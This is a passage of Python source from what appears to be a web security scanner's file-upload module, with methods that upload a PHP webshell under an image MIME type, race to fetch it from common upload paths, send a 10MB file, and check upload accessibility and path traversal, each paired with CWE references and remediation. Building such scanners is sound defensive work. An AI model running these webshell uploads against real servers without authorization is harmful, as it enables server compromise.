    async def _test_race_condition(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test race condition (TOCTOU - Time Of Check Time Of Use)"""
        vulnerabilities = []

        try:
            # Upload a file and immediately try to access it multiple times
            # If there's a race condition, we might be able to execute before validation completes

            filename = "race.php"

            # Create tasks for concurrent upload and access attempts
            upload_task = self._attempt_upload(
                endpoint=endpoint,
                field_name=field_name,
                filename=filename,
                content=self.WEBSHELL_PHP,
                mime_type="image/jpeg"
            )

            # Launch upload
            success, response_info = await upload_task

            if success:
                # Try to access the file immediately (race condition window)
                access_attempts = []
                for _ in range(10):
                    # Try common upload paths
                    for path_prefix in ['/uploads/', '/files/', '/media/', '/static/uploads/']:
                        access_url = endpoint.rsplit('/', 1)[0] + path_prefix + filename
                        access_attempts.append(self.client.get(access_url))

                # Execute all access attempts concurrently
                results = await asyncio.gather(*access_attempts, return_exceptions=True)

                # Check if any succeeded
                for result in results:
                    if not isinstance(result, Exception) and hasattr(result, 'status_code'):
                        if result.status_code == 200:
                            response_text = result.text if hasattr(result, 'text') else ''
                            if 'php' in response_text.lower() or '<?php' in response_text:
                                vulnerabilities.append(Vulnerability(
                                    id=f"file_upload_race_condition_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                                    title="File Upload Race Condition (TOCTOU)",
                                    description="The application has a race condition vulnerability in file upload processing. There's a time window between upload (Time Of Check) and security validation (Time Of Use) where the malicious file can be accessed and executed. This allows bypassing security checks.",
                                    severity=SeverityLevel.HIGH,
                                    category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                                    affected_url=endpoint,
                                    affected_parameter=field_name,
                                    proof_of_concept="Uploaded PHP file and successfully accessed it during validation window, indicating race condition exploitation is possible.",
                                    payload="race.php accessed during validation",
                                    remediation="Upload to temporary non-web-accessible location first, validate file completely, then move to final destination atomically. Never allow access to uploads before validation completes.",
                                    cwe_id="CWE-367",
                                    owasp_category="A04:2021 – Insecure Design",
                                    references=[
                                        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                                        "https://cwe.mitre.org/data/definitions/367.html",
                                    ]
                                ))
                                logger.warning(f"Race condition in file upload on {endpoint}")

                                if self.progress_callback:
                                    await self.progress_callback(f"  ✓ Race condition (TOCTOU) confirmed")

                                return vulnerabilities

        except Exception as e:
            logger.debug(f"Race condition test failed: {e}")

        return vulnerabilities

    async def _test_file_size_limits(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test for missing or inadequate file size limits"""
        vulnerabilities = []

        try:
            # Try uploading a large file (10MB)
            large_content = b'A' * (10 * 1024 * 1024)  # 10 MB

            success, response_info = await self._attempt_upload(
                endpoint=endpoint,
                field_name=field_name,
                filename="large_file.jpg",
                content=large_content,
                mime_type="image/jpeg"
            )

            if success:
                vulnerabilities.append(Vulnerability(
                    id=f"file_upload_size_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                    title="File Upload - Insufficient Size Limits",
                    description="The application accepts very large file uploads (10+ MB) without proper restrictions. This could lead to DoS attacks through storage exhaustion, bandwidth consumption, or memory exhaustion during processing.",
                    severity=SeverityLevel.MEDIUM,
                    category=VulnerabilityCategory.SECURITY_MISCONFIGURATION,
                    affected_url=endpoint,
                    affected_parameter=field_name,
                    proof_of_concept="Successfully uploaded a 10MB file without restrictions. Attackers could exhaust server storage or cause DoS by uploading many large files.",
                    payload="file_size: 10MB",
                    remediation="Implement reasonable file size limits based on application needs (e.g., 2MB for avatars, 5MB for images, 10MB for documents). Enforce limits on both client and server side. Monitor disk usage.",
                    cwe_id="CWE-400",
                    owasp_category="A05:2021 – Security Misconfiguration",
                ))
                logger.warning(f"No file size limit on {endpoint}")

                if self.progress_callback:
                    await self.progress_callback(f"  ✓ Large file upload (10MB) accepted")

        except Exception as e:
            logger.debug(f"File size limit test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _verify_file_accessibility(self, endpoint: str) -> List[Dict[str, Any]]:
        """CRITICAL: Verify if uploaded files are web-accessible"""
        accessible_files = []

        try:
            base_url = endpoint.rsplit('/', 1)[0]

            # Common upload directory patterns
            upload_paths = [
                '/uploads/', '/files/', '/media/', '/static/uploads/',
                '/upload/', '/file/', '/images/', '/assets/', '/user_content/',
                '/public/uploads/', '/storage/uploads/', '/content/'
            ]

            for file_info in self.uploaded_files_to_verify:
                filename = file_info['filename']

                for path_prefix in upload_paths:
                    test_url = base_url + path_prefix + filename

                    try:
                        response = await self.client.get(test_url)

                        if hasattr(response, 'status_code') and response.status_code == 200:
                            # File is accessible!
                            accessible_files.append({
                                'filename': filename,
                                'url': test_url,
                                'status': response.status_code,
                                'original_endpoint': file_info['endpoint']
                            })

                            logger.critical(f"Uploaded file is WEB-ACCESSIBLE: {test_url}")

                            if self.progress_callback:
                                await self.progress_callback(f"  🚨 CRITICAL: Uploaded file accessible at {test_url}")

                            break  # Found it, no need to try other paths

                    except Exception:
                        continue  # Try next path

                    await asyncio.sleep(0.02)

        except Exception as e:
            logger.debug(f"File accessibility verification error: {e}")

        return accessible_files

    def _create_accessibility_vulnerability(self, endpoint: str, file_info: Dict[str, Any]) -> Vulnerability:
        """Create vulnerability for web-accessible uploaded files"""
        return Vulnerability(
            id=f"file_upload_accessible_{hashlib.md5(file_info['url'].encode()).hexdigest()[:8]}",
            title="Uploaded File is Web-Accessible - CRITICAL",
            description=f"CRITICAL: The uploaded file '{file_info['filename']}' is directly accessible via web browser at {file_info['url']}. Combined with dangerous file extension or content, this allows immediate code execution and server compromise. This is the most critical aspect of file upload vulnerabilities.",
            severity=SeverityLevel.CRITICAL,
            category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
            affected_url=endpoint,
            affected_parameter="file",
            proof_of_concept=f"1. Uploaded file: {file_info['filename']}\n2. File is accessible at: {file_info['url']}\n3. HTTP Status: {file_info['status']}\n\nThis confirms the file can be accessed and potentially executed by attackers.\n\nTest: curl {file_info['url']}",
            payload=f"Accessible URL: {file_info['url']}",
            remediation="""
### CRITICAL IMMEDIATE ACTIONS:
1. **Store uploads OUTSIDE web root** - Files should not be in public directories
2. **Serve through controller** - Use download scripts that validate authorization
3. **Disable script execution** in upload directories:

   Apache (.htaccess):
   ```apache
   <FilesMatch "\\.(php|php3|php4|php5|phtml|pl|py|jsp|asp|sh|cgi)$">
       Order Allow,Deny
       Deny from all
   </FilesMatch>
   php_flag engine off
   ```

   Nginx (nginx.conf):
   ```nginx
   location /uploads/ {
       location ~ \\.php$ {
           deny all;
       }
   }
   ```

4. **Use separate domain/CDN** for user content (e.g., uploads.example.com)
5. **Content-Disposition: attachment** header to prevent execution
6. **Rename files** to remove original extension
7. **Implement access controls** - check authorization before serving files

### Architecture:
```
Good: /var/uploads/ (outside web root) -> Serve via /download.php?file=xxx
Bad:  /public/uploads/ (direct web access) -> Direct URL access
```
            """,
            cwe_id="CWE-434",
            owasp_category="A01:2021 – Broken Access Control",
            references=[
                "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
                "https://portswigger.net/web-security/file-upload",
            ]
        )

    async def _attempt_upload(self, endpoint: str, field_name: str, filename: str,
                            content: bytes, mime_type: str) -> Tuple[bool, Dict[str, Any]]:
        """Attempt to upload a file"""
        try:
            # Create file-like object
            file_obj = io.BytesIO(content)

            # Prepare multipart form data
            files = {field_name: (filename, file_obj, mime_type)}

            # Attempt upload
            response = await self.client.post(endpoint, files=files)

            if hasattr(response, 'status_code'):
                status_code = response.status_code
                # 200, 201, 202 indicate successful upload
                success = status_code in [200, 201, 202]

                response_info = {
                    'status_code': status_code,
                    'body': response.text if hasattr(response, 'text') else '',
                    'headers': dict(response.headers) if hasattr(response, 'headers') else {}
                }

                return success, response_info

        except Exception as e:
            logger.debug(f"Upload attempt failed: {e}")

        return False, {}

    async def _verify_upload_accepted(self, response_info: Dict[str, Any], filename: str) -> bool:
        """Verify if upload was actually accepted by checking response"""
        try:
            status_code = response_info.get('status_code', 0)

            # Check status code
            if status_code not in [200, 201, 202]:
                return False

            # Check response body for success indicators
            body = response_info.get('body', '').lower()
            success_keywords = ['success', 'uploaded', 'saved', 'completed', filename.lower(), 'file received']
            error_keywords = ['error', 'failed', 'invalid', 'not allowed', 'rejected', 'denied', 'forbidden']

            has_success = any(keyword in body for keyword in success_keywords)
            has_error = any(keyword in body for keyword in error_keywords)

            return has_success and not has_error

        except Exception:
            return False

    async def _check_path_traversal_success(self, response_info: Dict[str, Any], filename: str) -> bool:
        """Check if path traversal was successful"""
        try:
            body = response_info.get('body', '')

            # Look for the traversal path in response
            # If server echoes back the original filename with traversal, it might be vulnerable
            if '..' in body or filename in body:
                return True

            # If we got a success status, assume it worked
            return response_info.get('status_code') in [200, 201, 202]

        except Exception:
            return False
